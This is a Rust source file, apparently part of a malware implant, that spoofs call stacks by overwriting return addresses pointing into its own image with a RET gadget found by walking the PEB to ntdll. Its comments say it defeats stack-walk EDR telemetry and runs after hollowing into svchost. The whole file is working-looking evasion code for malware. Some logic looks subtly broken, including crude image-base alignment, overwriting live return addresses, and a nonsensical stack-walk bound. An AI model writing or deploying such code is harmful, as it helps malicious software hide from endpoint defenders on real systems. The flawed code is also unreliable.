//! spoof.rs — Call-stack spoofing via return-address overwrite
//!
//! spoof_stack() walks the current thread's stack frames and replaces
//! any return address that falls within our own PE image with a
//! plausible return address inside a legitimate Windows module
//! (kernel32 or ntdll) to defeat stack-walk-based EDR telemetry.
//!
//! Strategy:
//!   1. Find our own image base via `lea rax, [rip]`.
//!   2. Walk RSP frames up to MAX_FRAMES deep.
//!   3. For each frame whose return addr lands inside our image range,
//!      replace it with a RET gadget inside ntdll's text section.
//!
//! Called once, immediately after hollow_into_svchost returns.

#![allow(dead_code, non_snake_case)]

const MAX_FRAMES: usize = 64;
const OWN_IMAGE_SIZE: usize = 0x80000; // assumed 512 KB ceiling

/// Locate a `ret` byte (0xC3) inside ntdll text as a spoofing gadget.
/// Returns the address of the gadget, or 0 on failure.
unsafe fn find_ret_gadget_in_ntdll() -> usize {
    // Walk PEB Ldr to ntdll (second InMemoryOrder entry after the exe)
    let peb: *const u8;
    core::arch::asm!("mov {p}, gs:[0x60]", p = out(reg) peb);
    let ldr   = *(peb.add(0x18) as *const *const u8);
    let mut e = *(ldr.add(0x10) as *const *const u8);
    e = *(e as *const *const u8);
    let ntdll_base = *(e.add(0x30) as *const *const u8) as *const u8;

    // Parse PE to find .text section bounds
    let pe_off   = *(ntdll_base.add(0x3C) as *const u32) as usize;
    let nt       = ntdll_base.add(pe_off);
    let sec_count = *(nt.add(0x06) as *const u16) as usize;
    // Sections start at NT header + 0x18 (FileHeader.SizeOfOptionalHeader-independent for x64)
    let opt_size  = *(nt.add(0x14) as *const u16) as usize;
    let sec_start = nt.add(0x18 + opt_size);

    for i in 0..sec_count {
        let sec = sec_start.add(i * 0x28);
        // Name is 8 bytes at offset 0; characteristics at offset 0x24
        let chars = *(sec.add(0x24) as *const u32);
        // IMAGE_SCN_MEM_EXECUTE (0x20000000) && IMAGE_SCN_CNT_CODE (0x20)
        if chars & 0x20000000 == 0 { continue; }
        let virt_rva  = *(sec.add(0x0C) as *const u32) as usize;
        let virt_size = *(sec.add(0x08) as *const u32) as usize;
        let start     = ntdll_base.add(virt_rva);
        for off in 0..virt_size {
            if *start.add(off) == 0xC3 {
                return start.add(off) as usize;
            }
        }
    }
    0
}

/// Walk the current stack and overwrite return addresses that point into
/// our own image with a RET gadget inside ntdll.
pub unsafe fn spoof_stack() {
    let own_base: usize;
    core::arch::asm!("lea {b}, [rip]", b = out(reg) own_base);
    let own_base = own_base & !0xFFFF; // align to image base
    let own_end  = own_base + OWN_IMAGE_SIZE;

    let gadget = find_ret_gadget_in_ntdll();
    if gadget == 0 { return; }

    // Read current RSP
    let mut rsp: usize;
    core::arch::asm!("mov {r}, rsp", r = out(reg) rsp);

    for _ in 0..MAX_FRAMES {
        let candidate = *(rsp as *const usize);
        if candidate >= own_base && candidate < own_end {
            *(rsp as *mut usize) = gadget;
        }
        rsp = rsp.wrapping_add(8);
        // Stop if we've walked off into unmapped territory (crude guard)
        if rsp > own_end + 0x100000 { break; }
    }
}
